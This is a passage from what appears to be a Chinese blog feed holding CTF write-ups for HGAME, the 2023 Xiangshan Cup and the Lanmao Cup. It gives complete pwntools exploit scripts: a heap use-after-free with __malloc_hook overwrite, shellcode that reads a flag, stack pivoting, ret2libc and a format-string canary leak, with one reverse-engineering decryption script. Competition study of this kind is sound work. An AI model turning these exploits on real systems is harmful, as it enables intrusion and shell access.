io.sendlineafter(&#x27;Size: &#x27;, str(size))   # 最大0xFF -&gt; 0x100</span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # 可以 UAF</span><br><span class="line">  </span><br><span class="line">def edit(Index,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">for i in range(8):</span><br><span class="line">  alloc(i,0x80)        # chunk0-6: tcachebin; chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10)          # chunk8: 防 annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">  free(i)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(&#x27;\x7f&#x27;).ljust(8,b&#x27;\x00&#x27;)) - 0x60</span><br><span class="line">print(&#x27;main_arena       ---&gt;   &#x27;,hex(main_arena))</span><br><span class="line">libc_base = main_arena - 0x1ECB80</span><br><span class="line">print(&#x27;libc_base        ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;__malloc_hook    ---&gt;   &#x27;,hex(__malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook)</span><br><span class="line">edit(6,payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(9,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(10,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">for i in range(len(one_gadget)):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget[1])</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(11)) </span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))   </span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="shellcodemaster">ShellcodeMaster</h3>
<p>这题卡了最久...观察程序 context 然后研究怎么压缩
shellcode，整了老半天</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:31224&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">code = &#x27;&#x27;&#x27;</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">mov al, 10</span><br><span class="line">xchg rdi, r15</span><br><span class="line">mov dl, 7</span><br><span class="line">syscall</span><br><span class="line">xor eax, eax</span><br><span class="line">xchg esi, edi</span><br><span class="line">xor edi, edi</span><br><span class="line">xchg edx, ebx</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode1 = &#x27;&#x27;&#x27;</span><br><span class="line">mov rdi,0x2333008</span><br><span class="line">xor esi,esi</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line">xor edx,edx</span><br><span class="line">mov rdi,3</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload1 = asm(shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode=asm(code)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">payload = b&#x27;\x90&#x27;*(len(shellcode)-14) + b&#x27;flag\x00\x00\x00\x00&#x27; + b&#x27;\x90&#x27;*8 + payload1</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;n 27&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendafter(&#x27;bytes shellcode\n\n&#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rev---24">Rev - 2/4</h2>
<h3 id="ezcpp">ezcpp</h3>
<p>这题读 cpp 的部分相当简单，核心加密部分用的 Tea，不过魔改了加密的
block，只加密了前12bytes，还魔改了加密前 8bytes 时的 delta.</p>
<h3 id="babyre">babyre</h3>
<p>多线程处理，不过每一次加密都是原子的，idx是全局变量，等前一个thread释放以后下一个thread才能处理，所以数组每一个元素都被加密一次，整个程序使用类似于
ECB 的方式加密。</p>
<p>所以我们可以用最后一位也就是藏在 flag 后面的的 flag[33]
来一位一位的向前解密</p>
<p>但这题比较恶心的点就是，触发 SIGFPE
会flag[33]++，在加密flag[32]也就是<code>&#125;</code>这个字符时有一定的变化</p>
<p>其次，触发 SIGFPE 还会让 'feifei' 这个 key 再被 <code>xor 0x11</code>
一轮，所以中间的 key 值会更改好几次，我们还没办法具体预测哪里触发了
SIGFPE 。</p>
<p>但根据 flag 的前几位为<code>hgame&#123;</code>，我们可以用 try-except
来从前向后解密，如果发现出现的字符不对，或者抛出异常，我们就可以确定原程序这里触发了
SIGFPE，我们就自行对 key 值 xor，这样到最后也不用管 flag[33] 了</p>
<p>python 处理可能会溢出的数据一定要记得 &amp; 0x..FF 取低位字节</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">encflag = [<span class="number">0x00002F14</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004FF3</span>, <span class="number">0x0000006D</span>, <span class="number">0x000032D8</span>, <span class="number">0x0000006D</span>, <span class="number">0x00006B4B</span>, <span class="number">0xFFFFFF92</span>, <span class="number">0x0000264F</span>, <span class="number">0x0000005B</span>, <span class="number">0x000052FB</span>, <span class="number">0xFFFFFF9C</span>, <span class="number">0x00002B71</span>, <span class="number">0x00000014</span>, <span class="number">0x00002A6F</span>, <span class="number">0xFFFFFF95</span>, <span class="number">0x000028FA</span>, <span class="number">0x0000001D</span>, <span class="number">0x00002989</span>, <span class="number">0xFFFFFF9B</span>, <span class="number">0x000028B4</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004506</span>, <span class="number">0xFFFFFFDA</span>, <span class="number">0x0000177B</span>, <span class="number">0xFFFFFFFC</span>, <span class="number">0x000040CE</span>, <span class="number">0x0000007D</span>, <span class="number">0x000029E3</span>, <span class="number">0x0000000F</span>, <span class="number">0x00001F11</span>, <span class="number">0x000000FF</span>,<span class="number">0xFa</span>]</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;yo23412341234123412341234&#125;&#x27;</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;wtxwtx&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">ord</span>(flag[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exc = [<span class="number">8</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">17</span>,<span class="number">20</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">29</span>] <span class="comment"># 观察规律可知 exception_point = [x for x in range(8,30,3)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> exc:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            key[j] = key[j] ^ <span class="number">0x11</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] - flag[i]) // key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] - encflag[i]) &amp; <span class="number">0xFFFFFFFF</span>) ^ key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] // flag[i]) - key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] ^ encflag[i]) + key[(i+<span class="number">1</span>)%<span class="number">6</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)        </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[<span class="number">31</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023香山杯Pwn &amp; RE-wp</title>
    <url>/2023/10/15/comp%20-%202023%E9%A6%99%E5%B1%B1%E6%9D%AFPwn%20&amp;%20RE-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
香山杯！Pwn ak + RE 差几分钟就写完xxTEA啦😭
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h3 id="url从哪儿来">url从哪儿来</h3>
<p><img src="/pic/image-1.png" /></p>
<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
<img src="/pic/image-2.png" />
ida打开，因为它问url是什么，所以我们直接看szurl <img
src="/pic/image-3.png" />
结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
<img src="/pic/image-4.png" /> flag就在这 <img
src="/pic/image-5.png" /></p>
<h1 id="pwn">Pwn</h1>
<h3 id="move">Move</h3>
<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp头 ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;59.110.125.41&#x27;</span></span><br><span class="line">port = <span class="number">45341</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line">bss_addr = <span class="number">0x4050A0</span></span><br><span class="line">lea_addr = <span class="number">0x4012E0</span></span><br><span class="line">junk = <span class="number">0x30</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line">start_addr = <span class="number">0x401264</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;number&#x27;</span>,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈劫持 ---------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;a&#x27;</span>*junk + p64(bss_addr-<span class="number">8</span>) + p64(lea_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr  = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># sh_addr = 0x402027</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line"><span class="comment"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line"><span class="comment"># io.sendafter(&#x27;number&#x27;,payloadload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span></span><br><span class="line"><span class="comment"># io.send(payloadload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="pwthon">Pwthon</h3>
<p>Cpython pwn<br />
核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
gift泄露基地址和返回地址<br />
格式化字符串泄露canary<br />
通过puts泄露libc ret2libc <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">port = <span class="number">29572</span></span><br><span class="line"><span class="comment"># file = &#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base = gift- <span class="number">0x68B0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift&#x27;</span>,gift)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">31</span>+<span class="string">b&#x27;q%pq&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;q&#x27;</span>,drop=<span class="string">&#x27;Ture&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000003f8f</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000003cd9</span> + base</span><br><span class="line">bss = <span class="number">0x016FC0</span>+<span class="number">0x100</span>+base</span><br><span class="line">read = <span class="number">0x3940</span>+base</span><br><span class="line">write = <span class="number">0x03760</span>+base</span><br><span class="line">op = <span class="number">0x3AE0</span>+base</span><br><span class="line">flag = <span class="number">0x000000000003c257</span>+base</span><br><span class="line">puts = <span class="number">0x3710</span>+base</span><br><span class="line">ret = <span class="number">0x000000000000301a</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">33</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi)+p64(<span class="number">0x16078</span>+base)+p64(puts)+p64(base+<span class="number">0x99f0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;</span></span><br><span class="line">io.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len &quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">32</span>+p64(canary)*<span class="number">3</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Pwn</tag>
        <tag>Reverse</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
    <url>/2023/08/26/comp%20-%202023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学艺不精...对于"读/写函数对指针的利用"没那么敏感（
</blockquote>
<span id="more"></span>
<h1 id="xff-说在前面">0xff 说在前面</h1>
<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
7c9pe6</p>
<h1 id="x00-exploitations">0x00 Exploitations</h1>
<ol type="1">
<li>tcachebin libc2.31
<ol type="1">
<li>tcachebin poisoning</li>
<li>版本判断
<ol type="1">
<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
<li>tcache有doublefree检测，则是2.28以上</li>
<li>有tcache，则是2.26及以上</li>
</ol></li>
</ol></li>
<li>UAF</li>
<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
</ol>
<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
<pre><code>    首先进行一个反汇编的读   </code></pre>
<blockquote>
<p>trick: IDA中对变量按Y键可以改变变量类型</p>
</blockquote>
<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
src="/pic/Pasted%20image%2020230826231015.png" /> delete:
指针未置零，一眼UAF <img
src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
src="/pic/Pasted%20image%2020230826231127.png" /></p>
<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
<blockquote>
<p>分析部分</p>
</blockquote>
<ol type="1">
<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
<ol type="1">
<li>没办法直接用unsortedbin leak libc</li>
<li>不能通过填满tcachebin来绕过tcache机制</li>
<li>tcachebins poisoning
<ol type="1">
<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
</ol></li>
</ol></li>
<li>分析modify: 有puts/read
<ol type="1">
<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
</ol></li>
<li>分析delete
<ol type="1">
<li>UAF</li>
</ol></li>
<li>远程测试libc版本
<ol type="1">
<li>doubleFree有限制，2.28以上</li>
<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
</ol></li>
</ol>
<blockquote>
<p>思路构造部分</p>
</blockquote>
<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。</p>
<p>后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（</p>
<p>打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
<p>综上，思路为：<br />
1. 利用tcachebin的bk泄露堆地址 2.
在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
通过gdb发现"puts_got-8"正好是"free_got" 5.
而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
6. 由于chunk0_ptr,
chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
patchelf，根据远程调试选择了libc2.31 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的
<img src="/pic/Pasted%20image%2020230827001916.png" />
